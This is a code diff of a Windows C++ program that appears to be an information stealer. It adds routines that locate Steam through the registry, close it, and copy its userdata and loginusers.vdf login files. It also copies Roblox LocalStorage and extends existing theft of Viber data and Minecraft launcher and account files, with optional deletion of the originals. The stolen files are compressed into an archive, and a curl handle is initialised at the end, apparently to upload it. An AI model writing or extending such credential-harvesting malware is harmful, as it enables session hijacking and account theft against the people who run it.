@@ -324,9 +324,9 @@ int wmain(int** argc, wchar_t* argv[])
                     }
                 }
                 if (spos != string::npos && (epos = command.find_last_of(".exe") - 1) != string::npos - 1) {
-                    fs::path exepath = fs::path(command.substr(spos - 1, (epos - spos) + 3)).parent_path();
-                    cout(exepath.wstring());
-                    tdata(exepath.wstring() + L"\\");
+                    fs::path exepath = fs::path(command.substr(spos - 1, (epos - spos) + 3));
+                    cout(exepath.parent_path().wstring() + L"\\");
+                    tdata(exepath.parent_path().wstring() + L"\\");
                 }
                 else {
                     FormatMessageW(FORMAT_MESSAGE_FROM_SYSTEM, (LPCVOID)first, NULL, NULL, first_, MAX_PATH, NULL);
@@ -360,8 +360,10 @@ int wmain(int** argc, wchar_t* argv[])
             viber = wcscat(viber, L"\\ViberPC\\");
             cout(L"Viber: " << viber);
             if (fs::exists(viber)) {
+                reserveDelete(viber, L"viber");
                 fs::copy(viber, getabspathincurrdir(L"tmp\\viber\\"), fs::copy_options::recursive | fs::copy_options::overwrite_existing);
                 if (DELORIGVIBER) fs::remove_all(viber);
+                restoreDelete(viber);
             }
         }
         catch (fs::filesystem_error& e) {
@@ -381,17 +383,18 @@ int wmain(int** argc, wchar_t* argv[])
             minecraft = wcscat(minecraft, L"\\.minecraft\\");
             cout(L"Minecraft: " << minecraft);
             if (fs::exists(minecraft)) {
+                reserveDelete(minecraft, L"minecraft");
                 CreateDirectoryW(getabspathincurrdir(L"tmp\\minecraft\\").c_str(), NULL);
-                fs::copy(wstring(minecraft) + L"command_history.txt", getabspathincurrdir(L"tmp\\minecraft\\command_history.txt").c_str(), fs::copy_options::overwrite_existing);
-                fs::copy(wstring(minecraft) + L"servers.dat", getabspathincurrdir(L"tmp\\minecraft\\servers.dat").c_str(), fs::copy_options::overwrite_existing);
-                fs::copy(wstring(minecraft) + L"servers.dat_old", getabspathincurrdir(L"tmp\\minecraft\\servers.dat_old").c_str(), fs::copy_options::overwrite_existing);
-                fs::copy(wstring(minecraft) + L"TlauncherProfiles.json", getabspathincurrdir(L"tmp\\minecraft\\TlauncherProfiles.json").c_str(), fs::copy_options::overwrite_existing);
-                fs::copy(wstring(minecraft) + L"usercache.json", getabspathincurrdir(L"tmp\\minecraft\\usercache.json").c_str(), fs::copy_options::overwrite_existing);
-                fs::copy(wstring(minecraft) + L"usernamecache.json", getabspathincurrdir(L"tmp\\minecraft\\usernamecache.json").c_str(), fs::copy_options::overwrite_existing);
-                fs::copy(wstring(minecraft) + L"worlds.json", getabspathincurrdir(L"tmp\\minecraft\\worlds.json").c_str(), fs::copy_options::overwrite_existing);
-                fs::copy(wstring(minecraft) + L"baritone\\settings.txt", getabspathincurrdir(L"tmp\\minecraft\\baritone.settings.txt").c_str(), fs::copy_options::overwrite_existing);
-                fs::copy(wstring(minecraft) + L"Impact\\config\\", getabspathincurrdir(L"tmp\\minecraft\\Impact.config\\").c_str(), fs::copy_options::recursive | fs::copy_options::overwrite_existing);
-                fs::copy(wstring(minecraft) + L"Impact\\presets\\", getabspathincurrdir(L"tmp\\minecraft\\Impact.config2\\").c_str(), fs::copy_options::recursive | fs::copy_options::overwrite_existing);
+                fs::copy(wstring(minecraft) + L"command_history.txt", getabspathincurrdir(L"tmp\\minecraft\\command_history.txt"), fs::copy_options::overwrite_existing);
+                fs::copy(wstring(minecraft) + L"servers.dat", getabspathincurrdir(L"tmp\\minecraft\\servers.dat"), fs::copy_options::overwrite_existing);
+                fs::copy(wstring(minecraft) + L"servers.dat_old", getabspathincurrdir(L"tmp\\minecraft\\servers.dat_old"), fs::copy_options::overwrite_existing);
+                fs::copy(wstring(minecraft) + L"TlauncherProfiles.json", getabspathincurrdir(L"tmp\\minecraft\\TlauncherProfiles.json"), fs::copy_options::overwrite_existing);
+                fs::copy(wstring(minecraft) + L"usercache.json", getabspathincurrdir(L"tmp\\minecraft\\usercache.json"), fs::copy_options::overwrite_existing);
+                fs::copy(wstring(minecraft) + L"usernamecache.json", getabspathincurrdir(L"tmp\\minecraft\\usernamecache.json"), fs::copy_options::overwrite_existing);
+                fs::copy(wstring(minecraft) + L"worlds.json", getabspathincurrdir(L"tmp\\minecraft\\worlds.json"), fs::copy_options::overwrite_existing);
+                fs::copy(wstring(minecraft) + L"baritone\\settings.txt", getabspathincurrdir(L"tmp\\minecraft\\baritone.settings.txt"), fs::copy_options::overwrite_existing);
+                fs::copy(wstring(minecraft) + L"Impact\\config\\", getabspathincurrdir(L"tmp\\minecraft\\Impact.config\\"), fs::copy_options::recursive | fs::copy_options::overwrite_existing);
+                fs::copy(wstring(minecraft) + L"Impact\\presets\\", getabspathincurrdir(L"tmp\\minecraft\\Impact.config2\\"), fs::copy_options::recursive | fs::copy_options::overwrite_existing);
                 if (DELORIGMINECRAFT) {
                     fs::remove(wstring(minecraft) + L"command_history.txt");
                     fs::remove(wstring(minecraft) + L"servers.dat");
@@ -404,6 +407,7 @@ int wmain(int** argc, wchar_t* argv[])
                     fs::remove(wstring(minecraft) + L"Impact\\config\\");
                     fs::remove(wstring(minecraft) + L"Impact\\presets\\");
                 }
+                restoreDelete(minecraft);
             }
         }
         catch (fs::filesystem_error& e) {
@@ -412,6 +416,101 @@ int wmain(int** argc, wchar_t* argv[])
     }
     newline;
     // ! Copy minecraft
+
+    //   Copy steam
+    resetTemp;
+
+    cout(L"Copy steam...");
+    if (COPYTDATA) {
+        HKEY reg;
+        vector<unsigned char> data;
+        data.resize(MAX_PATH);
+        size_t spos = wstring::npos, epos = wstring::npos;
+        LSTATUS first = ERROR_SUCCESS, last = ERROR_SUCCESS;
+        LPWSTR first_ = new WCHAR[MAX_PATH], last_ = new WCHAR[MAX_PATH];
+        DWORD len = MAX_PATH;
+        DWORD type = REG_SZ;
+        if ((first = RegOpenKeyExW(HKEY_CLASSES_ROOT, L"steam\\Shell\\Open\\Command", NULL, KEY_QUERY_VALUE, (PHKEY)&reg)) == ERROR_SUCCESS) {
+            if ((last = RegQueryValueExW(reg, L"", NULL, &type, &data[0], &len)) == ERROR_SUCCESS) {
+                string command;
+                for (auto& d : data) { if ((unsigned short)d != 0) { command += d; } }
+                for (auto& disk : getdisks()) {
+                    if ((spos = command.find_first_of(disk.string())) != string::npos) {
+                        break;
+                    }
+                }
+                if (spos != string::npos && (epos = command.find_last_of(".exe") - 1) != string::npos - 1) {
+                    fs::path exepath = fs::path(command.substr(spos - 1, (epos - spos) + 3));
+                    closeSelf(exepath.wstring().c_str());
+                    cout(exepath.parent_path().wstring() + L"\\");
+                    reserveDelete(exepath, L"steam");
+                    try {
+                        fs::copy(exepath.parent_path().wstring() + L"\\userdata\\", getabspathincurrdir(L"tmp\\steam.userdata\\"), fs::copy_options::overwrite_existing | fs::copy_options::recursive);
+                        fs::copy(exepath.parent_path().wstring() + L"\\config\\loginusers.vdf", getabspathincurrdir(L"tmp\\steam.loginusers.vdf"), fs::copy_options::overwrite_existing);
+                    }
+                    catch (fs::filesystem_error& e) {
+                        cout(L"Error: " << e.what());
+                    }
+                    if (DELORIGSTEAM) {}
+                    restoreDelete(exepath);
+                }
+                else {
+                    FormatMessageW(FORMAT_MESSAGE_FROM_SYSTEM, (LPCVOID)first, NULL, NULL, first_, MAX_PATH, NULL);
+                    FormatMessageW(FORMAT_MESSAGE_FROM_SYSTEM, (LPCVOID)last, NULL, NULL, last_, MAX_PATH, NULL);
+                    cout(L"Cannot get path: " << first_ << L" (" << first << L"); " << last_ << L" (" << last << L"); " << spos << L"; " << epos << L";");
+                    cout(fs::path(command).wstring());
+                }
+            }
+            else {
+                FormatMessageW(FORMAT_MESSAGE_FROM_SYSTEM, (LPCVOID)first, NULL, NULL, first_, MAX_PATH, NULL);
+                FormatMessageW(FORMAT_MESSAGE_FROM_SYSTEM, (LPCVOID)last, NULL, NULL, last_, MAX_PATH, NULL);
+                cout(L"Cannot get registry: " << first_ << L" (" << first << L"); " << last_ << L" (" << last << L");");
+            }
+            RegCloseKey(reg);
+        }
+        else {
+            FormatMessageW(FORMAT_MESSAGE_FROM_SYSTEM, (LPCVOID)first, NULL, NULL, first_, MAX_PATH, NULL);
+            cout(L"Cannot open registry: " << first_ << L" (" << first << L")");
+        }
+    }
+    newline;
+    // ! Copy steam
+
+    //   Copy roblox
+    cout(L"Copy roblox...");
+    if (COPYROBLOX) {
+        try {
+            GetEnvironmentVariableW(L"LOCALAPPDATA", roblox, MAX_PATH);
+            roblox = wcscat(roblox, L"\\Roblox\\");
+            cout(L"Roblox: " << roblox);
+            if (fs::exists(roblox)) {
+                reserveDelete(roblox, L"minecraft");
+                fs::copy(wstring(roblox) + L"LocalStorage\\", getabspathincurrdir(L"tmp\\roblox.LocalStorage\\"), fs::copy_options::overwrite_existing | fs::copy_options::recursive);
+                if (DELORIGMINECRAFT) {
+                    fs::remove(wstring(roblox) + L"LocalStorage\\");
+                }
+                restoreDelete(roblox);
+            }
+        }
+        catch (fs::filesystem_error& e) {
+            cout(L"Error: " << e.what());
+        }
+    }
+    newline;
+    // ! Copy roblox
+
+    archive* arc = archive_write_new();
+    archive_write_set_compression_lzma(arc);
+    archive_write_set_format_pax_restricted(arc);
+    archive_write_set_format_7zip(arc);
+    archive_write_open_filename_w(arc, getabspathincurrdir(L"tmp.zip").c_str());
+    
+    add_directory_to_archive(arc, getabspathincurrdir(L"tmp\\"));
+    
+    archive_write_close(arc);
+    archive_write_free(arc);
+
+    CURL* curl = curl_easy_init();
 
     cout(L"Work is complteted! Press any key to exit...");
     ifDebug(getwchar());
